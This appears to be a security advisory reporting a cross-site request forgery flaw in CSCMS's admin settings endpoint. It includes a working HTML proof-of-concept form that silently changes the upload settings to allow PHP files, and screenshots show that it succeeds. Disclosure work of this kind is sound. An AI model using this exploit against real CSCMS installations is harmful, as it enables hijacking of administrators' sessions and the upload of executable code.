# CSCMS_CSRF
-----
### Code analysis
Vulnerability code is located ` \upload\plugins\sys\admin\Setting.php` 225 to 286 lines
![CSRF1](https://github.com/AvaterXXX/CScms/blob/master/images/CSRF1.png)
![CSRF2](https://github.com/AvaterXXX/CScms/blob/master/images/CSRF2.png)
There is no CSRF defense set, so there is a vulnerability

### POC
```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://IP/admin.php/setting/ftp_save" method="POST">
      <input type="hidden" name="UP&#95;Mode" value="1" />
      <input type="hidden" name="UP&#95;Size" value="20480" />
      <input type="hidden" name="UP&#95;Type" value="mp3&#124;mp4&#124;jpg&#124;gif&#124;png&#124;txt&#124;zip&#124;rar&#124;php" />
      <input type="hidden" name="UP&#95;Url" value="" />
      <input type="hidden" name="UP&#95;Pan" value="" />
      <input type="hidden" name="FTP&#95;Url" value="http&#58;&#47;&#47;demo&#46;chshcms&#46;com&#47;" />
      <input type="hidden" name="FTP&#95;Server" value="127&#46;0&#46;0&#46;1" />
      <input type="hidden" name="FTP&#95;Port" value="21" />
      <input type="hidden" name="FTP&#95;Dir" value="" />
      <input type="hidden" name="FTP&#95;Name" value="111" />
      <input type="hidden" name="FTP&#95;Pass" value="111&#42;&#42;&#42;&#42;&#42;&#42;" />
      <input type="hidden" name="FTP&#95;Ive" value="1" />
      <input type="hidden" name="CS&#95;Qn&#95;Bk" value="" />
      <input type="hidden" name="CS&#95;Qn&#95;Ak" value="" />
      <input type="hidden" name="CS&#95;Qn&#95;Sk" value="" />
      <input type="hidden" name="CS&#95;Qn&#95;Url" value="" />
      <input type="hidden" name="CS&#95;Os&#95;Bk" value="" />
      <input type="hidden" name="CS&#95;Os&#95;Ai" value="" />
      <input type="hidden" name="CS&#95;Os&#95;Ak" value="" />
      <input type="hidden" name="CS&#95;Upy&#95;Bucket" value="" />
      <input type="hidden" name="CS&#95;Upy&#95;Name" value="" />
      <input type="hidden" name="CS&#95;Upy&#95;Pwd" value="" />
      <input type="hidden" name="CS&#95;Upy&#95;Url" value="" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```

### Vulnerability display
PHP did not exist at the beginning
![CSRF3](https://github.com/AvaterXXX/CScms/blob/master/images/CSRF3.png)
USE POC
![CSRF4](https://github.com/AvaterXXX/CScms/blob/master/images/CSRF4.png)
PHP add success！
![CSRF5](https://github.com/AvaterXXX/CScms/blob/master/images/CSRF5.png)

#### Vulnerabilities are owned by Patec HanGuang Lab
#### ` https://www.patec.cn/`
